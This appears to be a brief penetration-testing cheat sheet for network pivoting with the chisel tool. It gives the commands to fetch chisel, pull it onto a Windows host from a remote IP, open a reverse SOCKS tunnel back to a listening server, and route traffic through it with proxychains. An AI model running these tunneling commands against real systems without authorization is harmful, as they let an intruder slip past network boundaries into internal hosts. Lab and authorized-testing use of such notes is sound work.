chisel
```
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
```

```
iwr http://ip:8080/chisel.exe -outfile chisel.exe
```

```
chisel server -p 9999 --reverse
```

```
./chisel.exe client ip:9999 R:9000:socks
```

```
sudo vim /etc/proxychains.conf

strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 9000
```
